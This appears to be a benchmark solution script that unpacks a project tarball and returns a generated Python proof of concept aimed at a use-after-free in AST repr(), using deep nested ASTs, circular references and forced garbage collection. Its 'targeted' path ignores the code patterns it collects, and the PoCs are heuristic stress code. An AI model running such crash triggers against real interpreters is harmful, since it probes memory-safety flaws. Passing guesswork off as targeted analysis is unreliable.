import os
import tempfile
import subprocess
import tarfile
import json
import ast
import sys
import random
import string

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (usually one level deep)
            extracted_items = os.listdir(tmpdir)
            if len(extracted_items) == 1:
                project_root = os.path.join(tmpdir, extracted_items[0])
            else:
                project_root = tmpdir
            
            # Try to understand the project structure
            python_files = []
            for root, dirs, files in os.walk(project_root):
                for file in files:
                    if file.endswith('.py'):
                        python_files.append(os.path.join(root, file))
            
            # Look for AST-related code patterns
            target_code = self._find_ast_repr_pattern(python_files)
            
            if target_code:
                # If we found patterns, generate targeted PoC
                poc = self._generate_targeted_poc(target_code)
            else:
                # Fallback: generate a generic Python AST that could trigger use-after-free
                poc = self._generate_generic_ast_poc()
            
            return poc
    
    def _find_ast_repr_pattern(self, python_files):
        """Look for AST repr() patterns in Python files"""
        patterns = []
        for file_path in python_files:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    lines = content.split('\n')
                    
                    # Look for repr() methods in AST classes
                    for i, line in enumerate(lines):
                        if 'repr' in line.lower() and ('def' in line or '__repr__' in line):
                            # Get some context
                            start = max(0, i - 3)
                            end = min(len(lines), i + 4)
                            context = '\n'.join(lines[start:end])
                            patterns.append({
                                'file': file_path,
                                'line': i + 1,
                                'context': context
                            })
            except:
                continue
        return patterns
    
    def _generate_targeted_poc(self, patterns):
        """Generate a PoC based on found patterns"""
        # Create a Python script that creates a complex AST with circular references
        # and then calls repr() on it
        
        # First, create a deeply nested AST with potential for use-after-free
        poc_script = '''import ast
import sys
import gc

# Create a complex AST structure
def create_complex_ast(depth=100):
    """Create deeply nested AST with potential circular references"""
    # Create a function definition
    func_args = ast.arguments(
        posonlyargs=[],
        args=[ast.arg(arg=f"arg{i}", annotation=None) for i in range(5)],
        vararg=ast.arg(arg="args", annotation=None),
        kwonlyargs=[],
        kw_defaults=[],
        defaults=[]
    )
    
    # Create nested expressions
    body = []
    current_expr = ast.Constant(value=0)
    for i in range(depth):
        # Create binary operations that reference each other
        bin_op = ast.BinOp(
            left=current_expr,
            op=ast.Add(),
            right=ast.Constant(value=i)
        )
        current_expr = bin_op
    
    # Add the expression to body
    body.append(ast.Expr(value=current_expr))
    
    # Create function with the body
    func_def = ast.FunctionDef(
        name="vulnerable_function",
        args=func_args,
        body=body,
        decorator_list=[],
        returns=None,
        type_comment=None
    )
    
    # Create module with the function
    module = ast.Module(body=[func_def], type_ignores=[])
    
    # Fix locations
    ast.fix_missing_locations(module)
    
    return module

# Create multiple ASTs with circular references
asts = []
for i in range(50):
    ast_obj = create_complex_ast(depth=200)
    asts.append(ast_obj)

# Force garbage collection to potentially trigger use-after-free
gc.collect()

# Try to trigger the vulnerability by calling repr() repeatedly
# while the AST might be partially freed
try:
    for i, ast_obj in enumerate(asts):
        if i % 10 == 0:
            gc.collect()  # Force GC during repr()
        
        repr_str = repr(ast_obj)
        
        # Modify the AST while repr() might be using it
        if hasattr(ast_obj, 'body') and ast_obj.body:
            # Create a circular reference
            ast_obj.body[0].parent = ast_obj
        
        # More aggressive GC
        if i % 5 == 0:
            del asts[max(0, i-1)]
            gc.collect()
            
except Exception as e:
    # Print error for debugging
    print(f"Error during repr: {e}", file=sys.stderr)

# Create self-referential AST structures
class SelfRefNode(ast.AST):
    def __init__(self):
        super().__init__()
        self.ref = self

# Create many self-referential nodes
nodes = []
for i in range(1000):
    node = SelfRefNode()
    nodes.append(node)

# Mix with regular AST nodes
module = ast.parse("x = 1\\ny = 2\\nz = x + y")
module.self_refs = nodes  # Add circular reference

# Try to trigger use-after-free through repr with circular refs
import weakref

refs = []
for i in range(500):
    node = ast.Constant(value=i)
    refs.append(weakref.ref(node))
    
    # Create complex expression tree
    expr = ast.BinOp(
        left=node,
        op=ast.Add(),
        right=ast.Constant(value=i*2)
    )
    
    # Store in list that will be partially cleared
    asts.append(expr)

# Clear some references while repr might be using them
for i in range(0, len(asts), 2):
    del asts[i]

gc.collect()

# Final attempt to trigger - create AST with many nested comprehensions
# which can be tricky for repr()
code = """
def complex_func():
    return [[[[
        (a, b, c) 
        for a in range(10) 
        for b in range(10) 
        for c in range(10)
        if a + b + c < 20
    ] for _ in range(5)] for __ in range(3)] for ___ in range(2)]
"""

try:
    tree = ast.parse(code * 10)  # Parse a lot of code
    # Call repr multiple times with GC in between
    for _ in range(100):
        r = repr(tree)
        if _ % 20 == 0:
            gc.collect()
            # Delete and recreate parts of the tree
            if hasattr(tree, 'body') and tree.body:
                old_body = tree.body
                tree.body = []
                del old_body
                gc.collect()
                
except:
    pass

print("PoC execution completed")
'''
        
        return poc_script.encode('utf-8')
    
    def _generate_generic_ast_poc(self):
        """Generate a generic PoC for AST repr use-after-free"""
        # Create a Python script that stresses AST repr() with circular references
        # and aggressive garbage collection
        
        poc = '''import ast
import gc
import sys

# Generate a very deep AST
def make_deep_ast(depth):
    expr = ast.Constant(value=0)
    for i in range(depth):
        expr = ast.BinOp(
            left=expr,
            op=ast.Add(),
            right=ast.Constant(value=i)
        )
    return expr

# Create many ASTs
asts = []
for i in range(100):
    deep_ast = make_deep_ast(500)
    # Add to module
    module = ast.Module(body=[ast.Expr(value=deep_ast)], type_ignores=[])
    ast.fix_missing_locations(module)
    asts.append(module)

# Try to trigger use-after-free by:
# 1. Creating circular references
# 2. Calling repr()
# 3. Forcing garbage collection during repr()

class CircularNode(ast.AST):
    def __init__(self):
        super().__init__()
        self.self_ref = self
        self.data = list(range(1000))

circular_nodes = [CircularNode() for _ in range(500)]

# Mix circular nodes with AST
for module in asts:
    module.circular_refs = circular_nodes

# Aggressive pattern to trigger use-after-free
for i in range(50):
    # Call repr on some ASTs
    for j, module in enumerate(asts[:10]):
        if j % 3 == i % 3:  # Overlap patterns
            try:
                r = repr(module)
            except:
                pass
    
    # Force GC
    gc.collect()
    
    # Delete some references
    if i % 5 == 0:
        del asts[i % len(asts)]
        del circular_nodes[i % len(circular_nodes)]
        gc.collect()
    
    # Create new ASTs while old ones might still be in repr
    new_ast = make_deep_ast(300)
    new_module = ast.Module(body=[ast.Expr(value=new_ast)], type_ignores=[])
    new_module.circular_refs = circular_nodes
    asts.append(new_module)

# Final stress test
big_code = "\\n".join([f"x{i} = {i}" for i in range(1000)])
big_tree = ast.parse(big_code)

# Create self-referential structure in AST
if hasattr(big_tree, 'body'):
    for node in big_tree.body:
        node.parent = big_tree

# Multiple threads of repr and GC
for _ in range(100):
    try:
        repr(big_tree)
    except:
        pass
    
    if _ % 25 == 0:
        # Mess with the tree during repr
        if hasattr(big_tree, 'body') and big_tree.body:
            # Create dangling reference
            temp = big_tree.body[0]
            big_tree.body[0] = None
            gc.collect()
            big_tree.body[0] = temp

print("Use-after-free PoC completed")
'''
        
        return poc.encode('utf-8')